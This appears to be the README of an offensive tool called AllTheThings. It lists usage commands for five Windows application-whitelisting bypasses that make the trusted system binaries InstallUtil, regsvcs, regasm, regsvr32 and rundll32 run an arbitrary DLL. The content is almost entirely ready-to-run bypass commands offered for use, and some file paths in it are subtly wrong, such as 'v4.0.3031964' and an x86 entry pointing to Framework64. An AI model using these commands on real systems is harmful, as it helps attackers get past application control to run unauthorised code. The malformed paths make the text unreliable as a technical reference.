# AllTheThings

###Includes 5 Known Application Whitelisting/ Application Control Bypass Techiniques in One File.

###1. InstallUtil.exe

###2. Regasm.exe

###3. Regsvcs.exe

###4. regsvr32.exe

###5. rundll32.exe



#Usage:
##1. 
    x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

    x64 - C:\Windows\Microsoft.NET\Framework\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
##2. 

    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll

    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
##3. 

    x86 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

##4. 

    regsvr32 /s  /u evil.dll -->Calls DllUnregisterServer

    regsvr32 /s evil.dll --> Calls DllRegisterServer
    
##5. 

    rundll32 AllTheThings.dll,EntryPoint
